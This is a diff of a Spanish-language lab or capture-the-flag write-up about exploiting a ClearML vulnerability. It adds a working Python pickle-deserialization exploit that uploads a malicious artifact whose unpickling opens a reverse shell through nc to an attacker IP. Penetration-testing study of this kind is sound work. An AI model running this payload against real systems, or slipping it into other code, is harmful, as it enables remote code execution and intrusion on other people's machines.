@@ -61,5 +61,30 @@ al abrir `clearml-ini` vamos a ingresar las credenciales de la api que creamos e
 ![[Pasted image 20240611125038.png]]
 
 ### exploit
-en esta web nos muestra un ejemplo de como aprovechar la vulnerabilidad para subir un archivo y poder tener ejecucion de coman
+en esta web nos muestra un ejemplo de como aprovechar la vulnerabilidad para subir un archivo y poder tener ejecución de comandos
+
+```python
+import os
+from clearml import Task
+
+class RunCommand:
+    def __reduce__(self):
+        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.40 9001 >/tmp/f"
+        return (os.system, (cmd,))
+
+command = RunCommand()
+
+task = Task.init(project_name="Black Swan",
+                 task_name="ddd-task",
+                 tags=["review"],
+                 task_type=Task.TaskTypes.data_processing,
+                 output_uri=True)
+
+task.upload_artifact(name="gamuke_artifact",
+                     artifact_object=command,
+                     retries=2,
+                     wait_on_upload=True)
+
+task.execute_remotely(queue_name='default')
+```
 ![[Pasted image 20240611125301.png]]
